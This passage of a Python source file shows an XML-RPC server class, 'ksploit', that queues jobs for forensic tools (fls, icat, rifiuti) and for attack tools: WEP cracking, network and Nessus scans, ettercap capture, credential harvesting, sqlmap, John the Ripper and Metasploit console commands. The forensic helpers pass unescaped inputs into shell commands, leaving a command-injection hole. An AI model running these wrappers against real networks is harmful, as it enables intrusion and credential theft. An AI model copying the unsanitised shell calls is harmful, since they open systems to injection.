        sout=getoutput("fls -f ntfs -m / -r  /dev/nbd0 | grep %s"%(searchString))        
    if '|' in sout:
        #looks like good fls content
        for line in sout.split('\n'):
            fls={}
            fls['filename']=line.split('|')[1]
            fls['inode']=line.split('|')[2].split('-')[0]
            listout.append(fls)
    jobs[myid]=listout


@run_async
def mygetRifiuti(myid,inode):
    jobs[myid]='<started>'
    listout=[]
    #run rifiuti against an inode
    #assumes disk is mounted on /dev/nbd0 and the inode is valid
    #icat the inode to a temp file
    icatFile=os.getcwd() + '/output/' + str(myid).replace(':','.')+'.icat'
    sout=getoutput("icat -f ntfs -s -r /dev/nbd0 %s > %s"%(inode,icatFile))
    if os.path.isfile(icatFile):
        #run rifiuti against it guarding against stray characters from our recovered file data.
        sout=getoutput("rifiuti %s |strings"%(icatFile))
        #this gets crazy sometimes on recovered files...
        sout=safestring(sout)
        for line in sout.split('\n'):
            listout.append(line)
    jobs[myid]=listout    



@run_async
def mygetIcat(myid,inode):
    jobs[myid]='<started>'
    listout=[]
    #run icat against an inode and return the raw output
    #assumes disk is mounted on /dev/nbd0 and the inode is valid
    #icat the inode to a temp file
    icatFile=os.getcwd() + '/output/' + str(myid).replace(':','.')+'.icat'
    sout=getoutput("icat -f ntfs -s -r /dev/nbd0 %s > %s"%(inode,icatFile))
    if os.path.isfile(icatFile):
        #guard against stray characters from our recovered file data.
        sout=getoutput("strings %s "%(icatFile))
        #this gets crazy sometimes on recovered files...
        sout=safestring(sout)
        for line in sout.split('\n'):
            listout.append(line)
    jobs[myid]=listout    


    
class ksploit:
    def jobresult(self,jobid):
        return(jobs[jobid])

    def jobs(self):
        print(jobs)
        return(jobs)

    def jobdelete(self,jobid):
        jobs.pop(jobid,'')

    def getDate(self):
        jobid='getdate:'+str(time.time())
        jobs[jobid]='<queued>'        
        mygetDate(jobid)
        return jobid

    def getHelp(self,command):
        jobid='getHelp:'+str(time.time())
        jobs[jobid]='<queued>'        
        mygetHelp(jobid,command)
        return jobid    

    def scanAccessPoints(self):
        jobid='scanAccessPoints:' + str(time.time())
        jobs[jobid]='<queued>'
        myscanAccessPoints(jobid)
        return jobid

    def getAccessPoints(self):
        jobid='getAccessPoints:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetAccessPoints(jobid)
        return jobid

    def monitorAccessPoint(self,bssid):
        jobid='monitorAccessPoint:' + str(time.time())
        jobs[jobid]='<queued>'
        mymonitorAccessPoint(jobid,bssid)
        return jobid

    def crackWEPAccessPoint(self,bssid,pcapfilename):
        jobid='crackWEPAccessPoint:' + str(time.time())
        jobs[jobid]='<queued>'
        mycrackWEPAccessPoint(jobid,bssid,pcapfilename)
        return jobid


    def getTweets(self,count,searchterm=""):
        jobid='getTweets:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetTweets(jobid,count,searchterm)
        return jobid

    def getSnortStats(self):
        jobid='getSnortStats:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetSnortStats(jobid)
        return jobid    

    def getSnortPriorityTotals(self):
        jobid='getSnortPriorityTotals:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetSnortPriorityTotals(jobid)
        return jobid    

    def getNetworks(self):
        jobid='getNetworks:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetNetworks(jobid)
        return jobid    

    def scanNetwork(self,cidr):
        jobid='scanNetwork:' + str(time.time())
        jobs[jobid]='<queued>'
        myscanNetwork(jobid,cidr)
        return jobid    

    def nessusScan(self,target):
        jobid='nessusScan:' + str(time.time())
        jobs[jobid]='<queued>'
        mynessusScan(jobid,target)
        return jobid    


    def sayText(self,speechText):
        jobid='sayText:' + str(time.time())
        jobs[jobid]='<queued>'
        mysayText(jobid,speechText)
        return jobid    


    def ettercapPcap(self,hostIP, nessusFindings):
        jobid='ettercapPcap:' + str(time.time())
        jobs[jobid]='<queued>'
        myettercapPcap(jobid,hostIP,nessusFindings)
        return jobid    
        

    def getCreds(self):
        jobid='getCreds:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetCreds(jobid)
        return jobid    

    def getSiteURLS(self,startingURL,useCreds=False):
        jobid='getSiteURLS:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetSiteURLS(jobid,startingURL,useCreds)
        return jobid    

    def sqlMap(self,startingURL,useCreds=False):
        jobid='sqlMap:' + str(time.time())
        jobs[jobid]='<queued>'
        mysqlMap(jobid,startingURL,useCreds)
        return jobid    


    def johnCrackCreds(self,creds={}):
        jobid='johnCrackCreds:' + str(time.time())
        jobs[jobid]='<queued>'
        myjohnCrackCreds(jobid,creds)
        return jobid    
    
    def msfHosts(self):
        jobid='msfHosts:' + str(time.time())
        jobs[jobid]='<queued>'
        mymsfHosts(jobid)
        return jobid    

    def msfConsoleCreate(self,ForceNew=False):
        jobid='msfConsoleCreate:' + str(time.time())
        jobs[jobid]='<queued>'
        mymsfConsoleCreate(jobid,ForceNew)
        return jobid    
    

    def msfConsoleWrite(self,msfcommand):
        jobid='msfConsoleWrite:' + str(time.time())
        jobs[jobid]='<queued>'
        mymsfConsoleWrite(jobid,msfcommand)
        return jobid    

    def msfConsoleRead(self):
        jobid='msfConsoleRead:' + str(time.time())
        jobs[jobid]='<queued>'
        mymsfConsoleRead(jobid)
        return jobid    

    def nbdConnect(self):
        jobid='nbdConnect:' + str(time.time())
        jobs[jobid]='<queued>'
        mynbdConnect(jobid)
        return jobid    

    def nbdDisconnect(self):
        jobid='nbdDisconnect:' + str(time.time())
        jobs[jobid]='<queued>'
        mynbdDisconnect(jobid)
        return jobid    


    def getFLS(self,searchString=''):
        jobid='getFLS:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetFLS(jobid,searchString)
        return jobid    

    def getRifiuti(self,inode):
        jobid='getrifiuti:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetRifiuti(jobid,inode)
        return jobid    

    def getIcat(self,inode):
        jobid='geticat:' + str(time.time())
        jobs[jobid]='<queued>'
        mygetIcat(jobid,inode)
        return jobid    


if __name__ == '__main__':
    # Instantiate and bind to localhost
    server = AsyncXMLRPCServer(('localhost', 8000), SimpleXMLRPCRequestHandler,allow_none=True,logRequests=False)

    # Register example object instance
    server.register_instance(ksploit())
    server.register_introspection_functions()

    # run!
    server.serve_forever()
